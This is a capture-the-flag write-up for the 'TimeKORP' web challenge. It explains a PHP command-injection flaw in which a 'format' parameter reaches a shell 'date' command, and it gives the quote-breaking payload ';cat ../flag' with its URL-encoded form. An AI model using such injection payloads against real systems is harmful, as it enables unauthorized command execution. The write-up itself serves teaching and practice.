# TimeKORP (<font color=green>Very Easy</font>)


## Description
Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.

## Tool Used
- Web Browser

## Skill Learned
- Command Injection via unsanitized input passed to a shell command in PHP

## Steps
1. Analyzed the backend PHP code:
    ```php
    $this->command = "date '+" . $format . "' 2>&1";
    ```
    The format parameter from the GET request is injected into a shell command without sanitization.
2. Crafted a payload to break out of the quotes and chain a second command:
    ```
    format=';cat ../flag'
    ```
3. URL-encoded the payload:
    ```
    /?format=%27;cat%20../flag%27
    ```
4. The server executes:
    ```
    date '+'';cat ../flag' 2>&1
    ```
    Which runs date and then cat ../flag.
5. The output of cat ../flag is captured and rendered in the response HTML via <?= $time ?>, exposing the flag.

